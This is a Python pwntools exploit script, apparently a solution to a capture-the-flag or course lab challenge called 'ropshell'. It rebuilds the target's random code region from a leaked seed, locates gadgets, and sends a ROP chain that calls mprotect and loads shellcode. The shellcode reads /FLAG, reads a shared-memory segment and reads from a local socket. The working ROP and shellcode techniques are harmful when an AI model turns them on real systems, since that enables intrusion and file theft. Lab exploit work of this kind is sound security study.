#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes

libc = ctypes.CDLL('libc.so.6')
context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)
if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

# gdb.attach(r)

rax_h = asm("""
ret
pop rax
""").hex()

rdi_h = asm("""
ret
pop rdi
""").hex()

rsi_h = asm("""
ret
pop rsi
""").hex()

rdx_h = asm("""
ret
pop rdx
""").hex()


test_asm = asm("""
mov rax, 60
mov rdi, 39
syscall
""")

part1_asm = asm("""
mov rax, 2                
lea rdi, [rip+str1]         
mov rsi, 0                
mov rdx, 0                
syscall                   
mov rdi, rax              

mov rax, 0                
mov rsi, rsp           
mov rdx, 1024             
syscall                   
mov rdx, rax              

mov rax, 1                
mov rdi, 1                
mov rsi, rsp
syscall                   
               
mov rdi, rax
mov rax, 60               
syscall                   

str1: .String "/FLAG"
""")

part2_asm = asm("""
mov rax, 29
mov rdi, 0x1337
mov rsi, 0
mov rdx, 0
syscall

mov rdi, rax
mov rax, 30
mov rsi, 0
mov rdx, 4096
syscall

mov rsi, rax
mov rax, 1
mov rdi, 1
mov rdx ,69
syscall

mov rdi, rax
mov rax, 60
syscall
""")

part3_asm = asm("""
mov rax, 41
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall

sub rsp, 16
mov WORD ptr [rsp], 2
mov WORD ptr [rsp+2], 0x3713
mov DWORD ptr [rsp+4], 0x0100007F
mov QWORD ptr [rsp+8], 0

mov rdi, rax
mov rax, 42
lea rsi, [rsp]
mov rdx, 16
syscall

mov rax, 0
mov rsi, rsp
mov rdx, 1024
syscall
mov rdx, rax

mov rax, 1
mov rdi, 1
mov rsi, rsp
syscall 

mov rdi, rax
mov rax, 60
syscall
"""
)

all_asm = asm("""
mov rax, 41
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall

sub rsp, 16
mov WORD ptr [rsp], 2
mov WORD ptr [rsp+2], 0x3713
mov DWORD ptr [rsp+4], 0x0100007F
mov QWORD ptr [rsp+8], 0

mov rdi, rax
mov rax, 42
lea rsi, [rsp]
mov rdx, 16
syscall

mov rax, 0
mov rsi, rsp
mov rdx, 1024
syscall
mov rdx, rax

mov rax, 1
mov rdi, 1
mov rsi, rsp
syscall 

mov rax, 29
mov rdi, 0x1337
mov rsi, 0
mov rdx, 0
syscall

mov rdi, rax
mov rax, 30
mov rsi, 0
mov rdx, 4096
syscall

mov rsi, rax
mov rax, 1
mov rdi, 1
mov rdx ,69
syscall

mov rax, 2                
lea rdi, [rip+str1]         
mov rsi, 0                
mov rdx, 0                
syscall                   
mov rdi, rax              

mov rax, 0                
mov rsi, rsp           
mov rdx, 1024             
syscall                   
mov rdx, rax              

mov rax, 1                
mov rdi, 1                
mov rsi, rsp
syscall                   
               
mov rdi, rax
mov rax, 60               
syscall                   

str1: .String "/FLAG"
""")

four_para_asm = [rax_h, rdi_h, rsi_h, rdx_h]
print("four_para_asm ", four_para_asm)

if 'bin' in sys.argv[1:]:
    # # local split
    text = r.recvline().decode()
    seed = int(text.split(" ")[3].strip())
    text = r.recvline().decode()
    start_addr = int(text.split(" ")[5].strip(),16)
else:
    # # remote split
    for i in range(2):
        r.recvline().decode()
    text = r.recvline().decode()
    print(text)
    seed = int(text.split(" ")[3].strip())

    text = r.recvline().decode()
    print(text)
    start_addr = int(text.split(" ")[5].strip(),16)




print("========================\n[seed: ", seed, "]\n[start_addr: ", hex(start_addr), "]\n========================")
libc.srand(seed)
LEN_CODE = (10*0x10000)

codeint = []

for i in range(int(LEN_CODE/4)):
    rd = ((libc.rand()<<16) & 0xffffffff) | (libc.rand() & 0xffff)
    codeint.append(rd)

sys_idx = int(libc.rand() % ((LEN_CODE/4) - 1))
codeint[sys_idx] = 0xc3050f

four_para_addr = []
print("===========four parameter=============")
for j in range(len(four_para_asm)):
    for i in range(len(codeint)):
        tmp = hex(codeint[i])[2:]
        lower = tmp[4:]
        # print(lower[i], tmp)
        if four_para_asm[j] == lower:
            print(tmp, "lower", lower, ",", i)
            four_para_addr.append(start_addr + (i*4))
            break

        upper = tmp[0:4]
        if four_para_asm[j] == upper:
            print(tmp, "upper", upper, ",", i)
            four_para_addr.append(start_addr + (i*4) + 2)
            break

print(four_para_addr)

print("======================================")

# r.send(p64(four_para_addr[0]) + p64(60) + p64(four_para_addr[1]) + p64(37) + p64(sys_idx*4 + start_addr))

# # four_para_asm = [rax_h, rdi_h, rsi_h, rdx_h]


r.sendafter(b'shell> ',
 p64(four_para_addr[0]) + p64(10) + p64(four_para_addr[1]) + p64(start_addr) + p64(four_para_addr[2]) + p64(1024) + p64(four_para_addr[3]) + p64(7) + p64(sys_idx*4 + start_addr)+
 p64(four_para_addr[0]) + p64(0) + p64(four_para_addr[1]) + p64(0) + p64(four_para_addr[2]) + p64(start_addr) + p64(four_para_addr[3]) + p64(1024) + p64(sys_idx*4 + start_addr) +
 p64(start_addr))

r.sendafter(b'received.', all_asm)

r.interactive()


# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 